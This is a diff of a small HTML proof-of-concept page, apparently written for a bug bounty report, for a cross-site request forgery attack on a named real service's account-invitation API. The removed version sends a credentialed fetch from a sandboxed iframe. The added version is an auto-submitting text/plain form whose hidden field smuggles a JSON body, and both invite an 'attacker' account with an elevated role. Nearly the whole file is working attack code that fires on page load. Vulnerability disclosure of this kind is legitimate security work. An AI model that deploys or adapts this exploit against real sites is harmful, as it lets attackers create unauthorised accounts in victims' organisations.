@@ -1,23 +1,17 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <iframe sandbox="allow-scripts allow-same-origin" srcdoc='
-    <script>
-      fetch("https://www.sellingpilot.com/api/account/inviting?_xhr=true", {
-        method: "POST",
-        mode: "no-cors",
-        credentials: "include",
-        headers: { "Content-Type": "text/plain" },
-        body: JSON.stringify({
-          name: "attacker",
-          email: "wongkebumen@wearehackerone.com",
-          roleId: 2,
-          status: 0,
-          vendorId: null,
-          lang: "en-us"
-        })
-      });
-    </script>
-  '></iframe>
+  <h1>CSRF PoC - Form text/plain</h1>
+  <form id="csrfForm"
+        action="https://www.sellingpilot.com/api/account/inviting?_xhr=true"
+        method="POST"
+        enctype="text/plain">
+    <input type="hidden"
+           name='{"name":"attacker","email":"wongkebumen@wearehackerone.com","roleId":2,"status":0,"vendorId":null,"lang":"en-us","x":"'
+           value='"}'>
+  </form>
+  <script>
+    document.getElementById('csrfForm').submit();
+  </script>
 </body>
 </html>
